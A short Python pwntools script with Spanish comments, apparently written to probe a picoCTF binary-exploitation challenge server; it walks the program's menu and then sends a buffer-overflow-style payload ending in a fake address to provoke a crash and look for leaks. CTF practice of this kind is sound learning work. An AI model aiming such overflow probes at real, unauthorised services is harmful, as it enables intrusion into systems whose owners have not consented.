#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

HOST = 'shape-facility.picoctf.net'
PORT = 49954

# Test rápido: intentar causar leak o verificar comportamiento

io = remote(HOST, PORT)

log.info("Probando comportamiento básico...")

# Agregar entrada
io.sendlineafter(b'Exit the app\n', b'1')
io.sendlineafter(b'name: \n', b'TESTNAME')

# Intentar salir normalmente
io.sendlineafter(b'Exit the app\n', b'3')
io.sendlineafter(b'appreciate it: \n', b'normal_exit')

# Verificar si el programa simplemente termina o hay output
try:
    output = io.recvall(timeout=2)
    log.info(f"Output al salir: {output}")
except:
    pass

io.close()

# Test 2: Causar crash controlado para ver si hay información
log.info("Test 2: Causar crash con dirección inválida")

io = remote(HOST, PORT)
io.sendlineafter(b'Exit the app\n', b'1')
io.sendlineafter(b'name: \n', b'TEST2')

# Payload con dirección obviamente inválida
crash_payload = b'A' * 8 + b'B' * 4 + b'C' * 8 + p64(0x4141414141414141)
io.sendlineafter(b'Exit the app\n', b'3')
io.sendlineafter(b'appreciate it: \n', crash_payload)

try:
    output = io.recvall(timeout=2)
    log.info(f"Output después de crash: {output}")
except:
    pass

io.close()

log.info("Tests completados")
